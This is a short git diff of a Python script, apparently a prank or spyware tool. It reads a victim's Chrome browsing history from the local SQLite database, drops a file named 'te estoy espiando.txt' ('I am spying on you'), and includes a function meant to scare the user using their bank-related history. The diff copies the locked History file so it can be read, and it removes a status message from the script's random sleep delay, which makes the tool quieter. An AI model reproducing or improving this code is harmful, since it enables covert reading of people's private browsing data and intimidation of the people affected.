@@ -5,6 +5,7 @@ import sqlite3
 import pathlib
 import re
 import glob
+import shutil
 
 
 NOMBRE_ARCHIVO = "te estoy espiando.txt"
@@ -23,7 +24,9 @@ def get_chrome_data(user_path):
     while not urls:
         try:
             ch_history_path = user_path + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
-            con = sqlite3.connect(ch_history_path)
+            ch_history_path_2 = user_path + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History_2"
+            shutil.copy(ch_history_path, ch_history_path_2)
+            con = sqlite3.connect(ch_history_path_2)
             cursor = con.cursor()
             cursor.execute("SELECT title, url FROM urls ORDER BY last_visit_time DESC")
             urls = cursor.fetchall()
@@ -87,7 +90,6 @@ def scare_user_with_banks(hacker_doc, chrome_history):
 def delay():
     n_hours = random.randrange(1, 3)
     n_min = random.randrange(1, 60)
-    print("Dormiremos {} horas y  {} minutos".format(n_hours, n_min))
     time.sleep(n_hours)
 
 
